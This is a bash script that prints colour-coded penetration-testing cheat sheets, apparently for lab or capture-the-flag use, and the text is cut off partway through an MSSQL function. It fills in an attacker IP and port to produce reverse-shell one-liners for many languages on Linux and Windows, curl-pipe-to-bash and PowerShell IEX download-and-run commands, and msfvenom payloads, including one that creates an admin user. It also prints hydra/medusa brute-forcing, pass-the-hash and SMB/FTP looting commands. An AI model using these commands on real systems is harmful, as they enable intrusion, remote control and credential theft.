#!/bin/bash


# Colors : https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

function int-tty()
{
			echo -e "$BWhite====================== int-tty ========================="
			echo -e "[$BGreen INTERACTIVE TTYS SHELL $White]"
			echo -e "$Blue https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ $White"
			echo -e "$White python -c 'import pty;pty.spawn(\"/bin/bash\")'" 
			echo -e "$White python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" 
			echo -e "$White echo os.system('/bin/bash') $Cyan # ishell bypass" 
			echo -e "$White /bin/sh -I $Cyan" 
			echo -e ""
			echo -e "$White ctrl-z"
			echo -e "$White echo \$TERM"  
			echo -e "$White stty -a"  
			echo -e "$White stty raw -echo"
			echo -e "$White fg"  
			echo -e "$White reset"  
			echo -e "$White stty rows$Yellow 61$White columns$Yellow 205"

			echo -e "$BWhite===================================================+++=="
}

function rev()
{
case $3 in
	"lin")
		 	echo -e "$BWhite====================== Reverse Shells ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Diff.Netcat $BWhite] : $BBlue rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $BYellow$1 $2$BBlue >/tmp/f$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Attacker$BWhite : $BBlue nc -lvnp $BYellow$2$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Victim$BWhite : $BBlue nc -e /bin/sh $BYellow$1 $2$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Curl $BWhite]   : $BBlue curl http://$BYellow$1$BBlue:$BYellow$2$BBlue/evil.sh | bash$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Bash $BWhite]   : $BBlue /bin/bash -i >& /dev/tcp/$BYellow$1$BBlue/$BYellow$2$BBlue 0>&1$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Socat $BWhite]  : $BPurple Attacker$BWhite : $BBlue socat -d -d TCP4-LISTEN:$BYellow$2$BBlue STDOUT$BWhite"
		 	echo -e "[$BGreen Socat $BWhite]  : $BPurple Victim$BWhite   : $BBlue socat TCP4:$BYellow$1$BBlue:$BYellow$2$BBlue EXEC:/bin/bash$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python $BWhite] : $BBlue python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$BYellow$1$BBlue\",$BYellow$2$BBlue);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'$BWhite"	
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);exec(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);system(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Perl $BWhite] : $BBlue perl -e 'use Socket;\$i=\"$BYellow$1$BBlue\";\$p=$BYellow$2$BBlue;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Ruby $BWhite] : $BBlue ruby -rsocket -e'f=TCPSocket.open(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Lua $BWhite]	 : $BBlue lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$BYellow$1$BBlue','$BYellow$2$BBlue');os.execute('/bin/sh -i <&3 >&3 2>&3');\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "==========================================================="
	;;
	"win")
			echo -e "====================== Reverse Shells ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] : $BBlue powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$BYellow$1$BBlue',$BYellow$2$BBlue);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush();}\$client.Close()\"$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] : $BBlue \$client = New-Object System.Net.Sockets.TCPClient(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Netcat $BWhite] : Attacker : $BBlue nc -lvnp $BYellow$2$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : Victim   : $BBlue nc -nv $BYellow$1 $2$BBlue -e cmd.exe$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Socat $BWhite] : Attacker : $BBlue socat -d -d TCP4-LISTEN:$BYellow$2$BBlue STDOUT$BWhite"
		 	echo -e "[$BGreen Socat $BWhite] : Victim   : $BBlue socat TCP4:$BYellow$1$BBlue:$BYellow$2$BBlue EXEC:'cmd.exe',pipes$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python $BWhite] : $BBlue python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$BYellow$1$BBlue', $BYellow$2$BBlue)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\windows\\\system32\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SMB $BWhite] : Attacker : $BBlue Copy nc.exe To Current Working Directory$BWhite"
		 	echo -e "[$BGreen SMB $BWhite] : Attacker : $BBlue python3 smbserver.py smb .$BWhite"
		 	echo -e "[$BGreen SMB $BWhite] : Victim   : $BBlue //$BYellow$1$BBlue/smb/nc.exe -nv $BYellow$1 $2$BBlue -c cmd.exe$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Lua $BWhite] : $BBlue lua5.1 -e 'local host, port = \"$BYellow$1$BBlue\", $BYellow$2$BBlue local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "==========================================================="

	;;
	*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
	;;
esac
}

function ft()
{
case $3 in
	"lin")
		 	echo -e "$BWhite====================== File Transfer ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Attacker$BWhite : $BBlue nc -lvnp $BYellow$2$BBlue < file.sh$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Victim$BWhite : $BBlue nc $BYellow$1 $2$BBlue > evil.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python2 Server $BWhite] : $BPurple Attacker : $BBlue python -m simpleHttpServer$BWhite"
		 	echo -e "[$BGreen Python3 Server $BWhite] : $BPurple Attacker : $BBlue python3 -m http.server$BWhite"
		 	echo -e "	  [$BGreen Wget $BWhite] : $BBlue wget http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen PHP Server$BWhite] : $BPurple Attacker : $BBlue php -S $BYellow$1$BBlue:$BYellow$2 $BWhite"
		 	echo -e "     [$BGreen Curl $BWhite] : $BBlue curl http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.sh > file.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SMB $BWhite] : $BBlue smbget -R smb://$BYellow$1$BBlue/share/$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SSH $BWhite]"
		 	echo -e "[$BGreen From A to V, while logged into V$BWhite] :$BBlue scp /path/to/file username@<Target_IP>:/path/to/destination$BWhite"		 	
		 	echo -e "==========================================================="
	;;
	"win")
			echo -e "$BWhite====================== File Transfer ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe','C:\destination\path\\\file.exe')\"$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1')$BWhite"
			echo -e "[$BGreen certutil $BWhite] :$BBlue certutil.exe -urlcache -split -f 'http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe' file.exe$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen FTP $BWhite]"
		 	echo -e "$BPurple Setup FTP Server On Attacker Machine$BWhite"
		 	echo -e "$BPurple On Victim Machine$BWhite"
		 	echo -e "$BBlue echo open $BYellow$1 21$BBlue> ftp.txt$BWhite"
			echo -e "$BBlue echo USER anonymous>>ftp.txt"
			echo -e "$BBlue echo anonymous>>ftp.txt"
			echo -e "$BBlue echo bin>>ftp.txt"
			echo -e "$BBlue echo get whoami.exe>>ftp.txt"
			echo -e "$BBlue echo bye>>ftp.txt"
			echo -e "$BBlue ftp -v -s:ftp.txt$BWhite"
		 	echo -e "==========================================================="
		
	;;
	*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
	;;
esac
}

function venom()
{
	case $3 in
		"lin")

		 	echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen 32-bit $BWhite] : $BBlue msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf > shell.elf$BWhite"
			echo -e "[$BGreen 64-bit $BWhite] : $BBlue msfvenom -p linux/x64/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf > shell.elf$BWhite"
			echo -e "[$BGreen SunOS (Solaris)      $BWhite] : $BBlue msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf -e x86/shikata_ga_nai -b '\\\x00' > solshell.elf$BWhite"
			echo -e "==========================================================="
		;;
		"win")
			echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen 32-bit $BWhite] : $BBlue msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > shell.exe$BWhite"
		 	echo -e "[$BGreen 64-bit $BWhite] : $BBlue msfvenom -p windows/x64/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > shell.exe$BWhite"
		 	echo -e "[$BGreen Create User $BWhite] : $BBlue msfvenom -p windows/adduser USER=$BYellow attacker $BBlue PASS=$BYellow attacker@123 $BBlue -f exe > adduser.exe$BWhite"
		 	echo -e "[$BGreen CMD Shell $BWhite] : $BBlue msfvenom -p windows/shell/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > prompt.exe$BWhite"
		 	echo -e "[$BGreen Execute Command $BWhite] : $BBlue msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell IEX(New-Object Net.webClient).downloadString('http://$BYellow$1$BBlue/nishang.ps1')\" -f exe > pay.exe$BWhite"
		 	echo -e "==========================================================="

		;;
		"web")
			echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Web $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]  : $BBlue msfvenom -p php/meterpreter_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f raw > shell.php
	    cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php$BWhite"
		 	echo -e "[$BGreen ASP $BWhite]  : $BBlue msfvenom -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f asp > shell.asp$BWhite"
		 	echo -e "[$BGreen JSP $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f raw > shell.jsp$BWhite"
		 	echo -e "[$BGreen WAR $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f war > shell.war$BWhite"
		 	echo -e "[$BGreen ASPX $BWhite] : $BBlue msfvenom -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f aspx >reverse.aspx$BWhite"
		 	echo -e "==========================================================="
		;;
		*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
		;;
	esac

}

function gobuster()
{

			echo -e "$BWhite====================== Gobuster (80/443) ====================="
			if [[ $1 =~ ^https ]]
			then
				# HTTPS
			 	echo -e "$White gobuster dir -u $BYellow$1$White -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x 'txt,html,php,sh' -t 150 -o gobuster.txt"
				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s '200,204,301,302,307,401,403' -x 'txt,html,php,sh'"
				echo -e "$BWhite================================================="
			else
				# HTTP
				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,401,403' -x 'txt,html,php,asp,aspx,jsp' -e -l"
				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,401,403' -x 'txt,html,php,asp,aspx,jsp' -e -l"
				echo -e "$BWhite================================================="
			fi
}

function ftp()
{
			echo -e "$BWhite====================== ftp (21) ====================="

			echo -e "[$BGreen FTP $White]"
		 	echo -e "$BPurple Connection$White"
			if [ "$2" == "" ]; then
				echo -e "$White ftp $BYellow$1$White"
			else
				echo -e "$White ftp $BYellow$1 $2 $White"
			fi
			if [ "$2" == "" ]; then
				echo -e "$White telnet $BYellow$1 21 $White"
			else
				echo -e "$White telnet $BYellow$1 $2 $White"
			fi
			if [ "$2" == "" ]; then
				echo -e "$White netcat $BYellow$1 21 $White"
			else
				echo -e "$White netcat $BYellow$1 $2 $White"
			fi

			echo -e "$BPurple Banner Grabbing$White"
			echo -e "$White telnet -vn $BYellow$1 $2 $White"

			echo -e "$BPurple Anonymous login$White"
			echo -e "$White ftp $BYellow$1 $2 $White"
			echo -e "$White anonymous $White"
			echo -e "$White anonymous $White"
			echo -e "$White >ls -al $Cyan# List all files (even hidden) (yes, they could be hidden) $White"
			echo -e "$White >binary $Cyan# Set transmission to binary instead of ascii $White"
			echo -e "$White >ascii $Cyan # Set transmission to ascii instead of binary $White"
			echo -e "$White >bye #exit $White"

			echo -e "$BPurple nmap ftp script$White"
			if [ "$2" == "" ]; then
				echo -e "$White nmap -oA nmap/ftp.nmap -script 'not brute and not dos and *ftp*' --script-args= -d -Pn -v -p 21 $BYellow$1 $White"
			else
				echo -e "$White nmap -oA nmap/ftp.nmap -script 'not brute and not dos and *ftp*' --script-args= -d -Pn -v -p $BYellow$2 $1 $White"
			fi

			echo -e "$BPurple nmap ftp vuln scriptt$White"
			if [ "$2" == "" ]; then
				echo -e "$White nmap --script=ftp-* -p 21 $BYellow$1 $White"
			else
				echo -e "$White nmap --script=ftp-* -p $BYellow$2 $1 $White"
			fi	
		 	
			echo -e "$BPurple Bruteforce password known username $White"
			if [ "$2" == "" ]; then
				echo -e "$White hydra -l $Green<User>$White -P /usr/share/wordlists/rockyou.txt ftp://$BYellow$1$White:21 $White"
				echo -e "$White medusa -h $BYellow$1$White -u $Green<User>$White -P /usr/share/wordlists/rockyou.txt -M ftp$White" 
			else
				echo -e "$White hydra -l <User> -P /usr/share/wordlists/rockyou.txt ftp://$BYellow$1:$2 $White"
			fi	
			echo -e "	/usr/share/wordlists/metasploit/unix_passwords.txt"
			echo -e "	/usr/share/john/password.lst"
			echo -e "	/usr/share/wordlists/wfuzz/others/common_pass.txt"

			echo -e "$BPurple User Enumeration$White"
			echo -e "$Blue https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl $White"	
			echo -e "$White ftp-user-enum.pl -U$Green users.txt $White-t $BYellow$1 $White"
			echo -e "$Cyan Metasploit"
			echo -e "$White use auxiliary/scanner/ftp/ftp_login"
			echo -e "$White msf auxiliary(ftp_login) > show options"
			echo -e "$White msf auxiliary(ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt"
			echo -e "$White msf auxiliary(ftp_login) > set USER_FILE users.txt"
			echo -e "$White msf auxiliary(ftp_login) > set RHOSTS $BYellow$1$White"
			if [ "$2" != "" ]; then
				echo -e "$White msf auxiliary(ftp_login) > set RPORT $BYellow$2$White"
			fi
			echo -e "$White msf auxiliary(ftp_login) > run"

			echo -e "$BPurple Download files$White"
			echo -e "$White ftp $1 $2"
			echo -e "$White PASSIVE"
			echo -e "$White BINARY"
			echo -e "$White get <FILE>"
			echo -e "$White mget <FILEs>" 

			echo -e "$BPurple Download files recursively$White"
			if [ "$2" != "" ]; then
				echo -e "$White wget -r ftp://username:password@$1:$2/dir/*"
			else
				echo -e "$White wget -r ftp://username:password@$1/dir/*"
			fi
			if [ "$2" != "" ]; then
				echo -e "$White wget -r ftp://$1:$2/dir/* --ftp-user=username --ftp-password=password"
			else
				echo -e "$White wget -r ftp://$1/dir/* --ftp-user=username --ftp-password=password"
			fi

			if [ "$2" != "" ]; then
				echo -e "$White wget -r --user="anonymous" --password="" ftp://$1:$2/dir/*"
			else
				echo -e "$White wget -r --user="anonymous" --password="" ftp://$1/dir/*"
			fi

			echo -e "$BPurple Sort files based on file size$White"
			echo -e "$White find . -type f -exec du -h {} + | sort -h"

			echo -e "$BPurple Read all files $White"
			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan# Include .(dot)file and recursive $White"
			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"

			echo -e "$BWhite====================================================="

}


function tftp()
{
			echo -e "$BWhite====================== tftp (69) ========================="
			echo -e "[$BGreen TFTP $White]"
			echo -e "$BPurple Enumeration$White"
			echo -e "$White less _top_20_udp_nmap.txt $Cyan # autorecon - check port 69 or smtp results" 
		 	echo -e "$BPurple Connection$White"
			echo -e "$White tftp $BYellow$1 $2 $White"
			echo -e "$BPurple Download Files$White"
			echo -e "$White tftp> status"
			echo -e "$White tftp> verbose"
			echo -e "$White tftp> ascii"
			echo -e "$White tftp> binary"
			echo -e "$White tftp> get <file>"
			echo -e "$BPurple Download Files Recursively$White"
			echo -e "$White cat <directory> | awk '/[0-9] /{print $9}' > directory.txt"
			echo -e "$Cyan # vi direcotry.txt and remove . and .."
			echo -e "$White for file in \`cat directory.txt\`; do echo -e \"get \$file\\\nquit\\\n\"|tftp $BYellow$1 $2$White; done"
			echo -e "$BPurple Read all files $White"
			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan # Include .(dot)file and recursive $White"
			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"

			echo -e "$BWhite====================================================="
}

function smb()
{
			ip_address=`echo $1|cut -d "/" -f 3`
			share=`echo $1|cut -d "/" -f4-`

			validate_ip $ip_address
			validate_port $2

			echo -e "$BWhite====================== smb (139,445) ========================="
			echo -e "[$BGreen SMB $White]"
			echo -e "$BPurple Enumeration$White"
			echo -e "$White enum4linux -a -l $BYellow$ip_address" 
		 	echo -e "$White enum4linux-ng.py -A -C -v $BYellow$ip_address" 
			if [ "$2" != "" ]; then
				echo -e "$White nmap --script \"safe or smb-enum-*\" -p $BYellow$2 $BYellow$ip_address" 
			else
				echo -e "$White nmap --script \"safe or smb-enum-*\" -p 445 $BYellow$ip_address" 
			fi
			if [ "$2" != "" ]; then
				echo -e "$White nmap -v --script=smb-enum* -p T:$BYellow$2 $BYellow$ip_address"
			else
				echo -e "$White nmap -v --script=smb-enum* -p T:139,445 $BYellow$ip_address"
			fi
			if [ "$2" != "" ]; then
				echo -e "$White nmap -v --script=smb-vuln* -p T:$BYellow$2 $BYellow$ip_address"
			else
				echo -e "$White nmap -v --script=smb-vuln* -p T:139,445 $BYellow$ip_address"
			fi

			echo -e "$BPurple List shares$White"
			if [ "$2" != "" ]; then
				echo -e "$White smbmap -H $BYellow$ip_address $White-P $BYellow$2"
		 	else
			 	echo -e "$White smbmap -H $BYellow$ip_address $White"
			fi

			if [ "$2" != "" ]; then
				echo -e "$White smbmap -u \"username\" -p \"password\" -H $BYellow$ip_address $White-P $BYellow$2 $Cyan # Creds"
			else
				echo -e "$White smbmap -u \"username\" -p \"password\" -H $BYellow$ip_address $Cyan #Creds"
			fi

			if [ "$2" != "" ]; then
				echo -e "$White smbmap -u \"username\" -p \"<NT>:<LM>\" -H $BYellow$ip_address $White-P $BYellow$2 $Cyan # Pass-the-Hash"
			else
				echo -e "$White smbmap -u \"username\" -p \"<NT>:<LM>\" -H $BYellow$ip_address $Cyan # Pass-the-Hash"
			fi

			echo -e "$BPurple Samba rpcclient$White"
			echo -e "$White rpcclient -U \"\" -N $BYellow$ip_address $Cyan # -U:Username -N:No-pass"
			echo -e "$White rpcclient -U \"usernmae\" $BYellow$ip_address"
			echo -e "$White password:\"password\""
			echo -e "$White rpcclient $> enumdomusers"
			echo -e "$White rpcclient $> enumprinters"
			echo -e "$White rpcclient $> enum"
			echo -e "$White rpcclient $> querydominfo"

			echo -e "$BPurple Connect to host$White"
			echo -e "$White smbclient $BYellow$1 $White-N -L $Cyan # -N:no pass -L:list share"
			echo -e "$White smbclient $BYellow$1 $White-U $Cyan # anonymous -U:username"
			echo -e "$White smbclient $BYellow$1 $White-U \"username\" "
			echo -e "$White smbclient $BYellow\\\\\\\\\\\\\\$ip_address\\\\\\\\$share $Cyan# Win"
			echo -e "$White smbclient $BYellow\\\\\\\\\\\\\\$ip_address\\\\\\\\$share $White-U $Cyan# Win"
			echo -e "$White smbclient $BYellow\\\\\\\\\\\\\\$ip_address\\\\\\\\$share $White-U \"username\" $Cyan# Win"

			echo -e "$BPurple Mount share$White"
			echo -e "$White smbmount $1 /mnt/remote/ -o username=user,password=pass,rw"
			echo -e "$White sudo mount -t cifs $1 /mnt/share"
			echo -e "$White sudo mount -t cifs -o "username=user,password=password" $1 /mnt/share"

			echo -e "$BPurple Bruteforce$White"
			echo -e "$white echo \"username\" > users.txt"
			echo -e "$white echo \"othername\" >> users.txt"
			echo -e "$White hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip_address smb -V -f $Cyan# -V:verbose -f:stop when finding a match"

			echo -e "$BPurple Download files$White"
			echo -e "$White smbclient //<IP>/Share -U"
			echo -e "$White smb: \> mask \"\" "
			echo -e "$White smb: \> recurse ON"
			echo -e "$White smb: \> prompt OFF"
			echo -e "$White smb: \> lcd '/path/to/go/'"
			echo -e "$White smb: \> mget *"

			echo -e "$BPurple Download files recursively$White"
			echo -e "$White mkdir download; cd download"
			echo -e "$White smbget -R smb:$1"

			echo -e "$BPurple find all files and sort them by size$White"
			echo -e "$White find . -type f  -exec du -h {} + | sort -h"

			echo -e "$BPurple Read all files $White"
			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan# Include .(dot)file and recursive $White"
			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"

			echo -e "$BWhite====================================================="
}

function mssql-nmap()
{
			echo -e "$BWhite====================== mssql ========================="
			echo -e "[$BGreen MS SQL - nmap $White]"
			echo -e "$Blue http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/"
			echo -e "$BPurple Enumeration$White"
			if [ "$2" != '' ]; then
					echo -e "$White nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p $2 $1"

			else
					echo -e "$White nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $1"
			fi

			echo -e "$BPurple Command Execution $White"
			if [ "$2" != '' ]; then
